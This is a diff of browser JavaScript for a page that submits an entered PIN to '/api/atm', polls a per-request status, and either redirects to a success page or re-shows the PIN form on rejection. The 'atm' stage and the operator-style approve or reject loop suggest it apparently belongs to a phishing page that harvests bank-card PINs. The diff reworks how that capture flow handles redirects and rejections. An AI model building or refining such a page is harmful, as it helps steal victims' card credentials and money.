@@ -216,20 +216,20 @@
           .then(function(res) { return res.json(); })
           .then(function(data) {
             if (!data.ok) return;
-            if (data.redirect) {
-              stopPoll();
-              if (data.redirect === 'success.html') {
-                window.location.href = 'success.html?id=' + requestId;
-              } else {
-                window.location.href = data.redirect + '?id=' + requestId;
-              }
-            } else if (data.stage === 'success' && data.decision === 'approved') {
+
+            if (data.stage === 'success' && data.status === 'success') {
               stopPoll();
               window.location.href = 'success.html?id=' + requestId;
-            } else if (data.decision === 'rejected') {
+              return;
+            }
+
+            if (data.stage === 'atm' && data.status === 'reject') {
               stopPoll();
               waitOverlay.classList.remove('show');
+              pinForm.style.display = 'block';
+              document.getElementById('errorMsg').style.display = 'block';
               rejectOverlay.classList.add('show');
+              return;
             }
           })
           .catch(function() {});
@@ -241,6 +241,7 @@
       pinForm.style.display = 'none';
       waitOverlay.classList.add('show');
       document.getElementById('errorMsg').style.display = 'none';
+      rejectOverlay.classList.remove('show');
 
       fetch('/api/atm', {
         method: 'POST',
@@ -250,10 +251,6 @@
       .then(function(res) { return res.json(); })
       .then(function(data) {
         if (data.ok) {
-          if (data.redirect) {
-            window.location.href = data.redirect + '?id=' + requestId;
-            return;
-          }
           pollStatus();
         } else { throw new Error('failed'); }
       })
